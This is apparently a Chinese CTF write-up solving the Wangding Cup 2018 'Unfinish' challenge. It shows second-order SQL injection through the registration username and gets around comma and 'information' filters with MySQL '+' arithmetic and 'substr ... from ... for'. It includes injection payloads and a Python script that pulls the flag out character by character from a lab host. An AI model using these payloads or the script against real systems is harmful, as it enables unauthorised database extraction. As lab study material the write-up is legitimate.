---
title: '[网鼎杯2018]Unfinish'
date: 2024-06-17 20:57:45
tags: 
     - 题解
     - sql注入
categories: 刷题笔记
---

## [网鼎杯2018]Unfinish（'+'在sql注入的应用）

我们在register页面先随便注册一个账号登录

![image-20240617211257114](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406172113379.png)

在页面中我们能看到我们的用户名

![image-20240617211327687](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406172113255.png)

我们猜测在用户名处存在二次注入

为了验证我们的猜想，我们再次注册一个账号

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415175724563.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415175745635.png)

发现用户名变为0了，说明存在二次注入

我们对用户名进行fuzz，发现逗号，information等许多关键字被过滤了

绕过方法：

mysql中，+只能当做运算符

当我们执行select  '1' + '1a'时 结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415180818324.png)

执行select  '0'+database();

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415180904669.png)

变成了0，我们用ascii码进行计算

select '0'+ascii(substr(database(),1,1));

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415181036615.png)

出来了库的第一位的ascii值

我们回到题目，由于逗号被过滤了，我们用from for 来代替

0'+ascii(substr(database() from 1 for 1))+'0;

![image-20240617212324402](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406172123509.png)

成功回显，因为过滤了information，我们猜测字段名为flag

最后，我们借鉴个脚本

```
import requests
import logging
import re
from time import sleep

# LOG_FORMAT = "%(lineno)d - %(asctime)s - %(levelname)s - %(message)s"
# logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)

def search():
    flag = ''
    url = 'http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/'
    url1 = url+'register.php'
    url2 = url+'login.php'
    for i in range(100):
        sleep(0.3)#不加sleep就429了QAQ
        data1 = {"email" : "1234{}@123.com".format(i), "username" : "0'+ascii(substr((select * from flag) from {} for 1))+'0;".format(i), "password" : "123"}
        data2 = {"email" : "1234{}@123.com".format(i), "password" : "123"}
        r1 = requests.post(url1, data=data1)
        r2 = requests.post(url2, data=data2)
        res = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r2.text)
        res1 = re.search(r'\d+', res.group())
        flag = flag+chr(int(res1.group()))
        print(flag)
    print("final:"+flag)

if __name__ == '__main__':
    search()

```

![image-20240617212845932](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406172128000.png)

虽然有点离谱，但flag好歹出来了
